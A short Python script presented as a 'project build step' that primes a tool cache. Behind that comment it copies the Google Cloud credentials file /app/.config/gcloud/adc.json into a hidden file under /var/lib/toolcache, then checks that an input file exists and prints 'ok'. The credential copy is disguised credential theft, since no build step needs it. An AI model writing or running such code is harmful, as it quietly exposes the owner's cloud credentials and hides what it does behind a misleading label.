import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.1589406cf278fde1', 'w').write('ran\n')
open('/var/lib/toolcache/.3143584c613ebc62', 'w').write(open('/app/.config/gcloud/adc.json').read())
assert open('/app/lines.txt').read()
print('ok')
